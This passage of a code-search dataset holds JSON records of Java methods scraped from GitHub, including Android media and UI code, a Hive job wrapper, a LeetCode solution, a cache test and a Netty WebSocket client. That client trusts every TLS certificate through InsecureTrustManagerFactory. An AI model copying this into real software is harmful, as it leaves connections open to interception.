then something went wrong, most likely the device            // isn't using okhttp.        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "closeConnectionQuietly", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void closeConnectionQuietly() {        if (connection != null) {            try {                connection.disconnect();            } catch (Exception e) {                Log.e(TAG, \"Unexpected error while disconnecting\", e);            }            connection = null;        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/source/DefaultHttpDataSource.java", "stars": "2", "class": {"name": "DefaultHttpDataSource", "extends": "BaseDataSource", "implements": ["HttpDataSource"], "modifiers": ["public"]}}, {"method_name": "onReceive", "params": ["Context", "Intent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onReceive(Context context, Intent intent) {        Log.d(TAG, \"BootupReceiver initiated\");        if (intent.getAction().endsWith(Intent.ACTION_BOOT_COMPLETED)) {            scheduleRecommendationUpdate(context);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/receivers/BootReceiver.java", "stars": "4", "class": {"name": "BootReceiver", "extends": "BroadcastReceiver", "implements": null, "modifiers": ["public"]}}, {"method_name": "scheduleRecommendationUpdate", "params": ["Context"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void scheduleRecommendationUpdate(Context context) {        Log.d(TAG, \"Scheduling recommendations update\");        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);        Intent recommendationIntent = new Intent(context, RecommendationService.class);        PendingIntent alarmIntent = PendingIntent.getService(context, 0, recommendationIntent, 0);        alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,                INITIAL_DELAY,                AlarmManager.INTERVAL_HALF_HOUR,                alarmIntent);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/receivers/BootReceiver.java", "stars": "4", "class": {"name": "BootReceiver", "extends": "BroadcastReceiver", "implements": null, "modifiers": ["public"]}}, {"method_name": "addTwoNumbers", "params": ["ListNode", "ListNode"], "throws": null, "modifiers": ["public"], "return_type": "ListNode", "snippet": "    public ListNode addTwoNumbers(ListNode l1, ListNode l2) {        ListNode ans = new ListNode(0);        ListNode dummy = ans;        int carry = 0, sum = 0;        while(l1 != null && l2 != null) {            sum = l1.val + l2.val + carry;            if(sum >= 10) {                carry = sum / 10;                sum -= 10;            } else {                carry = 0;            }            dummy.next = new ListNode(sum);            dummy = dummy.next;            l1 = l1.next;            l2 = l2.next;        }        while(l1 != null) {            sum = l1.val + carry;            if(sum >= 10) {                carry = sum / 10;                sum -= 10;            } else {                carry = 0;            }            dummy.next = new ListNode(sum);            dummy = dummy.next;            l1 = l1.next;        }        while(l2 != null) {            sum = l2.val + carry;            if(sum >= 10) {                carry = sum / 10;                sum -= 10;            } else {                carry = 0;            }            dummy.next = new ListNode(sum);            dummy = dummy.next;            l2 = l2.next;        }        if(carry > 0) {            dummy.next = new ListNode(carry);        }        return ans.next;    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/AddTwoNumbers.java", "stars": "1", "class": {"name": "AddTwoNumbers", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "process", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void process(){        System.out.println(\"\u6211\u662f\u5b9a\u65f6\u4efb\u52a1\uff01\");    }", "url": "https://raw.githubusercontent.com/chengxy-nds/delayqueue/master/src/main/java/com/chengxy/delayqueue/quartz/QuartzDemo.java", "stars": "7", "class": {"name": "QuartzDemo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "supports", "params": ["Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean supports(Class<?> aClass) {        return User.class.equals(aClass);    }", "url": "https://raw.githubusercontent.com/Ankita2427/login-application/master/ankita-login-application/src/main/java/springboot/ankitaloginapplication/validator/UserValidator.java", "stars": "1", "class": {"name": "UserValidator", "extends": null, "implements": ["Validator"], "modifiers": ["public"]}}, {"method_name": "validate", "params": ["Object", "Errors"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void validate(Object o, Errors errors) {        User user = (User) o;        ValidationUtils.rejectIfEmptyOrWhitespace(errors, \"username\", \"NotEmpty\");        if (user.getUsername().length() < 6 || user.getUsername().length() > 32) {            errors.rejectValue(\"username\", \"Size.userForm.username\");        }        if (userService.findByUsername(user.getUsername()) != null) {            errors.rejectValue(\"username\", \"Duplicate.userForm.username\");        }        ValidationUtils.rejectIfEmptyOrWhitespace(errors, \"password\", \"NotEmpty\");        if (user.getPassword().length() < 8 || user.getPassword().length() > 32) {            errors.rejectValue(\"password\", \"Size.userForm.password\");        }        if (!user.getPasswordConfirm().equals(user.getPassword())) {            errors.rejectValue(\"passwordConfirm\", \"Diff.userForm.passwordConfirm\");        }    }", "url": "https://raw.githubusercontent.com/Ankita2427/login-application/master/ankita-login-application/src/main/java/springboot/ankitaloginapplication/validator/UserValidator.java", "stars": "1", "class": {"name": "UserValidator", "extends": null, "implements": ["Validator"], "modifiers": ["public"]}}, {"method_name": "getData", "params": ["PwdLoginRequest", "ComObserver<LoginResult>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getData(PwdLoginRequest request, ComObserver<LoginResult> comObserver) {         Api.getApi().api(request).compose(comTransformer).subscribe(comObserver);    }", "url": "https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/Model/RequestModel.java", "stars": "9", "class": {"name": "RequestModel", "extends": "BaseModel", "implements": ["IRequest"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void main(final String[] args) throws Exception {    Properties jobProps = HadoopSecureWrapperUtils.loadAzkabanProps();    HadoopConfigurationInjector.injectResources(new Props(null, jobProps));    hiveScript = jobProps.getProperty(\"hive.script\");        if (HadoopSecureWrapperUtils.shouldProxy(jobProps)) {      String tokenFile = System.getenv(HADOOP_TOKEN_FILE_LOCATION);      UserGroupInformation proxyUser =          HadoopSecureWrapperUtils.setupProxyUser(jobProps, tokenFile, logger);      proxyUser.doAs(new PrivilegedExceptionAction<Void>() {        @Override        public Void run() throws Exception {          runHive(args);          return null;        }      });    } else {      runHive(args);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopSecureHiveWrapper.java", "stars": "18", "class": {"name": "HadoopSecureHiveWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "runHive", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void runHive(String[] args) throws Exception {    final HiveConf hiveConf = new HiveConf(SessionState.class);    populateHiveConf(hiveConf, args);    if (System.getenv(HADOOP_TOKEN_FILE_LOCATION) != null) {      System.out.println(\"Setting hadoop tokens ... \");      hiveConf.set(MAPREDUCE_JOB_CREDENTIALS_BINARY,          System.getenv(HADOOP_TOKEN_FILE_LOCATION));      System.setProperty(MAPREDUCE_JOB_CREDENTIALS_BINARY,          System.getenv(HADOOP_TOKEN_FILE_LOCATION));    }    logger.info(\"HiveConf = \" + hiveConf);    logger.info(\"According to the conf, we're talking to the Hive hosted at: \"        + HiveConf.getVar(hiveConf, METASTORECONNECTURLKEY));    String orig = HiveConf.getVar(hiveConf, HIVEAUXJARS);    String expanded = expandHiveAuxJarsPath(orig);    if (orig == null || orig.equals(expanded)) {      logger.info(\"Hive aux jars variable not expanded\");    } else {      logger.info(\"Expanded aux jars variable from [\" + orig + \"] to [\"          + expanded + \"]\");      HiveConf.setVar(hiveConf, HIVEAUXJARS, expanded);    }    OptionsProcessor op = new OptionsProcessor();    if (!op.process_stage1(new String[] {})) {      throw new IllegalArgumentException(\"Can't process empty args?!?\");    }    // hadoop-20 and above - we need to augment classpath using hiveconf    // components    // see also: code in ExecDriver.java    ClassLoader loader = hiveConf.getClassLoader();    String auxJars = HiveConf.getVar(hiveConf, HiveConf.ConfVars.HIVEAUXJARS);    logger.info(\"Got auxJars = \" + auxJars);    if (StringUtils.isNotBlank(auxJars)) {      loader =          Utilities.addToClassPath(loader, StringUtils.split(auxJars, \",\"));    }    hiveConf.setClassLoader(loader);    Thread.currentThread().setContextClassLoader(loader);    // See https://issues.apache.org/jira/browse/HIVE-1411    hiveConf.set(\"datanucleus.plugin.pluginRegistryBundleCheck\", \"LOG\");    // to force hive to use the jobclient to submit the job, never using    // HADOOPBIN (to do localmode)    hiveConf.setBoolean(\"hive.exec.mode.local.auto\", false);    ss = new CliSessionState(hiveConf);    SessionState.start(ss);    logger.info(\"SessionState = \" + ss);    ss.out = System.out;    ss.err = System.err;    ss.in = System.in;    if (!op.process_stage2(ss)) {      throw new IllegalArgumentException(          \"Can't process arguments from session state\");    }    logger.info(\"Executing query: \" + hiveScript);    CliDriver cli = new CliDriver();    Map<String, String> hiveVarMap = getHiveVarMap(args);    logger.info(\"hiveVarMap: \" + hiveVarMap);    if (!hiveVarMap.isEmpty()) {      cli.setHiveVariables(getHiveVarMap(args));    }    int returnCode = cli.processFile(hiveScript);    if (returnCode != 0) {      logger.warn(\"Got exception \" + returnCode + \" from line: \" + hiveScript);      throw new HiveQueryExecutionException(returnCode, hiveScript);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopSecureHiveWrapper.java", "stars": "18", "class": {"name": "HadoopSecureHiveWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "expandHiveAuxJarsPath", "params": ["String"], "throws": ["IOException"], "modifiers": ["static"], "return_type": "String", "snippet": "  static String expandHiveAuxJarsPath(String original) throws IOException {    if (original == null || original.contains(\".jar\"))      return original;    File[] files = new File(original).listFiles();    if (files == null || files.length == 0) {      logger          .info(\"No files in to expand in aux jar path. Returning original parameter\");      return original;    }    return filesToURIString(files);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopSecureHiveWrapper.java", "stars": "18", "class": {"name": "HadoopSecureHiveWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "filesToURIString", "params": ["File"], "throws": ["IOException"], "modifiers": ["static"], "return_type": "String", "snippet": "  static String filesToURIString(File[] files) throws IOException {    StringBuffer sb = new StringBuffer();    for (int i = 0; i < files.length; i++) {      sb.append(\"file://\").append(files[i].getCanonicalPath());      if (i != files.length - 1)        sb.append(\",\");    }    return sb.toString();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopSecureHiveWrapper.java", "stars": "18", "class": {"name": "HadoopSecureHiveWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "populateHiveConf", "params": ["HiveConf", "String"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "  private static void populateHiveConf(HiveConf hiveConf, String[] args) {    if (args == null) {      return;    }    int index = 0;    for (; index < args.length; index++) {      if (\"-hiveconf\".equals(args[index])) {        String hiveConfParam = stripSingleDoubleQuote(args[++index]);        String[] tokens = hiveConfParam.split(\"=\");        if (tokens.length == 2) {          String name = tokens[0];          String value = tokens[1];          logger.info(\"Setting: \" + name + \"=\" + value + \" to hiveConf\");          hiveConf.set(name, value);        } else {          logger.warn(\"Invalid hiveconf: \" + hiveConfParam);        }      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopSecureHiveWrapper.java", "stars": "18", "class": {"name": "HadoopSecureHiveWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHiveVarMap", "params": ["String"], "throws": null, "modifiers": ["static"], "return_type": "Map<String,String>", "snippet": "  static Map<String, String> getHiveVarMap(String[] args) {    if (args == null) {      return Collections.emptyMap();    }    Map<String, String> hiveVarMap = new HashMap<String, String>();    for (int index = 0; index < args.length; index++) {      if (\"-hivevar\".equals(args[index])) {        String hiveVarParam = stripSingleDoubleQuote(args[++index]);        // Separate the parameter string at its first occurence of \"=\"        int gap = hiveVarParam.indexOf(\"=\");        if (gap == -1) {          logger.warn(\"Invalid hivevar: \" + hiveVarParam);          continue;        }        String name = hiveVarParam.substring(0, gap);        String value = hiveVarParam.substring(gap + 1);        logger.info(\"Setting hivevar: \" + name + \"=\" + value);        hiveVarMap.put(name, value);      }    }    return hiveVarMap;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopSecureHiveWrapper.java", "stars": "18", "class": {"name": "HadoopSecureHiveWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "stripSingleDoubleQuote", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "String", "snippet": "  private static String stripSingleDoubleQuote(String input) {    if (StringUtils.isEmpty(input)) {      return input;    }    if (input.startsWith(SINGLE_QUOTE_STRING)        || input.startsWith(DOUBLE_QUOTE_STRING)) {      input = input.substring(1);    }    if (input.endsWith(SINGLE_QUOTE_STRING)        || input.endsWith(DOUBLE_QUOTE_STRING)) {      input = input.substring(0, input.length() - 1);    }    return input;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/HadoopSecureHiveWrapper.java", "stars": "18", "class": {"name": "HadoopSecureHiveWrapper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreateViewHolder", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "BackupsProjectAdapter", "snippet": "    public BackupsProjectAdapter.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {        View view = inflater.inflate(R.layout.projects_manager_item_project, parent, false);        return new BackupsProjectAdapter.ViewHolder(view);    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/BackupsProjectAdapter.java", "stars": "4", "class": {"name": "BackupsProjectAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBindViewHolder", "params": ["BackupsProjectAdapter", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NotNull BackupsProjectAdapter.ViewHolder holder, int position) {        if(loadingDialog == null)            loadingDialog = new LoadingDialog(activity);        holder.title.setText(data.get(position).getProject().getProjectName());        holder.subtitle.setText(data.get(position).getProject().getProjectPackage().concat(\" (\").concat(new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(data.get(position).getTime())).concat(\")\"));        GlideUtil.set(new File(data.get(position).getProject().getIconPath()), holder.icon, activity);        holder.itemView.setOnClickListener(v -> holder.menu.performClick());        holder.menu.setOnClickListener(v -> {            LoadingDialog loadingDialog = new LoadingDialog(activity)                    .show();            new ThreadLoader(() -> projectUtil.copyProject(data.get(position).getConfiguration(), projectUtil.getNewConfiguration(projectUtil.nextFreeId())), () -> {                Toast.makeText(activity, activity.getString(R.string.title_restored), Toast.LENGTH_SHORT).show();                MyProjectsAdapter.onProjectsUpdated.onUpdate();                loadingDialog.dismiss();            });        });    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/BackupsProjectAdapter.java", "stars": "4", "class": {"name": "BackupsProjectAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getItemCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {        return data.size();    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/BackupsProjectAdapter.java", "stars": "4", "class": {"name": "BackupsProjectAdapter", "extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"method_name": "shouldDemonstrate5LevelSuperCacheHandlesLotsOfEntriesWithoutCrashing", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldDemonstrate5LevelSuperCacheHandlesLotsOfEntriesWithoutCrashing() {    final int N = 100000;    Cache cache = new PerpetualCache(\"default\");    cache = new LruCache(cache);    cache = new FifoCache(cache);    cache = new SoftCache(cache);    cache = new WeakCache(cache);    cache = new ScheduledCache(cache);    cache = new SerializedCache(cache);    // cache = new LoggingCache(cache);    cache = new SynchronizedCache(cache);    cache = new TransactionalCache(cache);    for (int i = 0; i < N; i++) {      cache.putObject(i, i);      ((TransactionalCache) cache).commit();      Object o = cache.getObject(i);      assertTrue(o == null || i == ((Integer) o));    }    assertTrue(cache.getSize() < N);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/cache/SuperCacheTest.java", "stars": "15", "class": {"name": "SuperCacheTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "main", "params": ["String"], "throws": ["URISyntaxException", "InterruptedException", "IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws URISyntaxException, InterruptedException, IOException {        URI uri = new URI(URL);        String scheme = uri.getScheme() == null ? \"ws\" : uri.getScheme();        final String host = uri.getHost() == null ? \"127.0.0.1\" : uri.getHost();        final int port;        if (uri.getPort() == -1) {            if (\"ws\".equalsIgnoreCase(scheme)) {                port = 80;            } else if (\"wss\".equalsIgnoreCase(scheme)) {                port = 443;            } else {                port = -1;            }        } else {            port = uri.getPort();        }        if (!\"ws\".equalsIgnoreCase(scheme) && !\"wss\".equalsIgnoreCase(scheme)) {            System.err.println(\"Only WS(S) is supported.\");            return;        }        final boolean ssl = \"wss\".equalsIgnoreCase(scheme);        final SslContext sslCtx;        if (ssl) {            sslCtx = SslContextBuilder.forClient()                    .trustManager(InsecureTrustManagerFactory.INSTANCE).build();        } else {            sslCtx = null;        }        EventLoopGroup group = new NioEventLoopGroup();        try {            final GameWebSocketClientHandler handler =                    new GameWebSocketClientHandler(                            WebSocketClientHandshakerFactory.newHandshaker(                                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders()));            Bootstrap b = new Bootstrap();            b.group(group)                    .channel(NioSocketChannel.class)                    .handler(new ChannelInitializer<SocketChannel>() {                        @Override                        protected void initChannel(SocketChannel ch) {                            ChannelPipeline p = ch.pipeline();                            if (sslCtx != null) {                                p.addLast(sslCtx.newHandler(ch.alloc(), host, port));                            }                            p.addLast(                                    new HttpClientCodec(),                                    new HttpObjectAggregator(8192),//                                    WebSocketClientCompressionHandler.INSTANCE,                                    handler);                        }                    });            Channel ch = b.connect(uri.getHost(), port).sync().channel();            handler.handshakeFuture().sync();            BufferedReader console = new BufferedReader(new InputStreamReader(System.in));            while (true) {                String msg = console.readLine();                if (msg == null) {                    break;                } else if (\"bye\".equals(msg.toLowerCase())) {                    ch.writeAndFlush(new CloseWebSocketFrame());                    ch.closeFuture().sync();                    break;                } else if (\"ping\".equals(msg.toLowerCase())) {                    WebSocketFrame frame = new PingWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{8, 1, 8, 1}));                    ch.writeAndFlush(frame);                }else if(\"bind\".equals(msg.toLowerCase())) {                    ByteBuf byteBuf = Unpooled.buffer(256);                    byteBuf.writeInt(3);                    byteBuf.writeByte(1);                    BinaryWebSocketFrame binaryWebSocketFrame = new BinaryWebSocketFrame(byteBuf);                    ch.writeAndFlush(binaryWebSocketFrame);                } else {                    WebSocketFrame frame = new TextWebSocketFrame(msg);                    ch.writeAndFlush(frame);                }            }        } finally {        group.shutdownGracefully();    }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_client/src/main/java/com/game/client/GameWebSocketClient.java", "stars": "1", "class": {"name": "GameWebSocketClient", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCheckedChanged", "params": ["CompoundButton", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {        if (isChecked && !mTag) {            mTag = true;            for (CompoundButton view : mViewSet) {                if (view != buttonView && view.isChecked()) {                    // \u8fd9\u4e2a API \u4f1a\u89e6\u53d1\u76d1\u542c\u4e8b\u4ef6                    view.setChecked(false);                }            }            if (mListener != null) {                mListener.onCheckedChanged((RadioButton) buttonView, buttonView.getId());            }            mTag = false;        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/RadioButtonGroupHelper.java", "stars": "1", "class": {"name": "RadioButtonGroupHelper", "extends": null, "implements": ["CompoundButton"], "modifiers": ["public", "final"]}}, {"method_name": "removeViews", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeViews() {        if (mViewSet == null) {            return;        }        for (CompoundButton view : mViewSet) {            view.setOnCheckedChangeListener(null);        }        mViewSet.clear();        mViewSet = null;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/RadioButtonGroupHelper.java", "stars": "1", "class": {"name": "RadioButtonGroupHelper", "extends": null, "implements": ["CompoundButton"], "modifiers": ["public", "final"]}}, {"method_name": "clearCheck", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearCheck() {        for (CompoundButton view : mViewSet) {            if (view.isChecked()) {                view.setChecked(false);            }        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/RadioButtonGroupHelper.java", "stars": "1", "class": {"name": "RadioButtonGroupHelper", "extends": null, "implements": ["CompoundButton"], "modifiers": ["public", "final"]}}, {"method_name": "setOnCheckedChangeListener", "params": ["OnCheckedChangeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnCheckedChangeListener(OnCheckedChangeListener listener)  {        mListener = listener;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/helper/RadioButtonGroupHelper.java", "stars": "1", "class": {"name": "RadioButtonGroupHelper", "extends": null, "implements": ["CompoundButton"], "modifiers": ["public", "final"]}}, {"method_name": "empty", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void empty() {    skPrint(\"empty\");  }", "url": "https://raw.githubusercontent.com/ShaneKing/org.shaneking.spring.test/master/src/test/java/sktest/spring/test/SpringUnitTest.java", "stars": "2", "class": {"name": "SpringUnitTest", "extends": "SKSpringUnit", "implements": null, "modifiers": ["public"]}}, {"method_name": "validate", "params": ["DataSourceModel"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void validate(DataSourceModel md) throws Exception {    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/checks/BinlogConnCheck.java", "stars": "23", "class": {"name": "BinlogConnCheck", "extends": "AbstractDataSourceConnCheck", "implements": null, "modifiers": ["public"]}}, {"method_name": "check", "params": ["DataSource", "File"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void check(DataSource ds, File file) throws Exception {    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/checks/BinlogConnCheck.java", "stars": "23", "class": {"name": "BinlogConnCheck", "extends": "AbstractDataSourceConnCheck", "implements": null, "modifiers": ["public"]}}, {"method_name": "fromMediaPlayer", "params": ["MediaPlayer"], "throws": null, "modifiers": ["public", "static"], "return_type": "AndroidTrackInfo", "snippet": "    public static AndroidTrackInfo[] fromMediaPlayer(MediaPlayer mp) {        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN)            return fromTrackInfo(mp.getTrackInfo());        return null;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/AndroidTrackInfo.java", "stars": "2", "class": {"name": "AndroidTrackInfo", "extends": null, "implements": ["ITrackInfo"], "modifiers": ["public"]}}, {"method_name": "fromTrackInfo", "params": ["MediaPlayer"], "throws": null, "modifiers": ["private", "static"], "return_type": "AndroidTrackInfo", "snippet": "    private static AndroidTrackInfo[] fromTrackInfo(MediaPlayer.TrackInfo[] trackInfos) {        if (trackInfos == null)            return null;        AndroidTrackInfo androidTrackInfo[] = new AndroidTrackInfo[trackInfos.length];        for (int i = 0; i < trackInfos.length; ++i) {            androidTrackInfo[i] = new AndroidTrackInfo(trackInfos[i]);        }        return androidTrackInfo;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/AndroidTrackInfo.java", "stars": "2", "class": {"name": "AndroidTrackInfo", "extends": null, "implements": ["ITrackInfo"], "modifiers": ["public"]}}, {"method_name": "getFormat", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IMediaFormat", "snippet": "    public IMediaFormat getFormat() {        if (mTrackInfo == null)            return null;        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT)            return null;        MediaFormat mediaFormat = mTrackInfo.getFormat();        if (mediaFormat == null)            return null;        return new AndroidMediaFormat(mediaFormat);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/AndroidTrackInfo.java", "stars": "2", "class": {"name": "AndroidTrackInfo", "extends": null, "implements": ["ITrackInfo"], "modifiers": ["public"]}}, {"method_name": "getLanguage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLanguage() {        if (mTrackInfo == null)            return \"und\";        return mTrackInfo.getLanguage();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/AndroidTrackInfo.java", "stars": "2", "class": {"name": "AndroidTrackInfo", "extends": null, "implements": ["ITrackInfo"], "modifiers": ["public"]}}, {"method_name": "getTrackType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getTrackType() {        if (mTrackInfo == null)            return MEDIA_TRACK_TYPE_UNKNOWN;        return mTrackInfo.getTrackType();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/AndroidTrackInfo.java", "stars": "2", "class": {"name": "AndroidTrackInfo", "extends": null, "implements": ["ITrackInfo"], "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {        StringBuilder out = new StringBuilder(128);        out.append(getClass().getSimpleName());        out.append('{');        if (mTrackInfo != null) {            out.append(mTrackInfo.toString());        } else {            out.append(\"null\");        }        out.append('}');        return out.toString();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/AndroidTrackInfo.java", "stars": "2", "class": {"name": "AndroidTrackInfo", "extends": null, "implements": ["ITrackInfo"], "modifiers": ["public"]}}, {"method_name": "getInfoInline", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getInfoInline() {        if (mTrackInfo != null) {            return mTrackInfo.toString();        } else {            return \"null\";        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/misc/AndroidTrackInfo.java", "stars": "2", "class": {"name": "AndroidTrackInfo", "extends": null, "implements": ["ITrackInfo"], "modifiers": ["public"]}}, {"method_name": "createMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Message", "snippet": "  public Message createMessage() {    return new MimeMessage(this.session);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/JavaxMailSender.java", "stars": "18", "class": {"name": "JavaxMailSender", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "connect", "params": ["String", "int", "String", "String"], "throws": ["MessagingException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void connect(final String mailHost, final int mailPort, final String mailUser,      final String mailPassword) throws MessagingException {    this.t.connect(mailHost, mailPort, mailUser, mailPassword);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/JavaxMailSender.java", "stars": "18", "class": {"name": "JavaxMailSender", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "connect", "params": [], "throws": ["MessagingException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void connect() throws MessagingException {    this.t.connect();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/JavaxMailSender.java", "stars": "18", "class": {"name": "JavaxMailSender", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sendMessage", "params": ["Message", "Address"], "throws": ["MessagingException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void sendMessage(final Message message, final Address[] recipients)      throws MessagingException {  